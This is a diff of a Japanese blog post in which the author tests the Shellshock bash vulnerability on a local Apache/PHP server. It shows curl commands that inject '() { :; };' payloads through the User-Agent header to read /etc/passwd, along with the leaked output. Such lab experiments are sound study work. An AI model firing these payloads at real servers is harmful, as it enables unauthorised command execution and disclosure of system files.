@@ -13,7 +13,7 @@ Copyright: (C) 2017 Ryuichi Ueda
 
 <?php
 	system('date');
-?&gt;
+?>
 ```
 
 <!--more-->
@@ -64,7 +64,7 @@ apache:x:48:48:Apache:/var/www:/sbin/nologin
 [root\@localhost httpd]# cat /var/www/html/index.php 
 <?php
 	system('date');
-?&gt;
+?>
 ```
 
 もう一度突っつく。
@@ -80,12 +80,12 @@ Fri Oct 3 20:27:38 JST 2014
 #!/usr/bin/php
 
 <?php
-	print(&quot;hoge\\n&quot;);
-?&gt;
+	print("hoge\\n");
+?>
 ```
 
 ```bash
-uedambp:IPSJ_SHELLSHOCK ueda$ curl -A '() { :; }; /bin/cat /etc/passwd | /usr/bin/tail -n 3' http://localhost:8888/index.php 2&gt; /dev/null
+uedambp:IPSJ_SHELLSHOCK ueda$ curl -A '() { :; }; /bin/cat /etc/passwd | /usr/bin/tail -n 3' http://localhost:8888/index.php 2> /dev/null
 hoge
 ```
 
@@ -97,13 +97,13 @@ hoge
 #!/usr/bin/php
 
 <?php
-	system(&quot;date&quot;);
-?&gt;
+	system("date");
+?>
 ```
 
 ダメ。
 ```bash
-uedambp:IPSJ_SHELLSHOCK ueda$ curl -A '() { :; }; /bin/cat /etc/passwd | /usr/bin/tail -n 3' http://localhost:8888/index.php 2&gt; /dev/null
+uedambp:IPSJ_SHELLSHOCK ueda$ curl -A '() { :; }; /bin/cat /etc/passwd | /usr/bin/tail -n 3' http://localhost:8888/index.php 2> /dev/null
 sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
 ueda:x:500:500::/home/ueda:/bin/bash
 apache:x:48:48:Apache:/var/www:/sbin/nologin
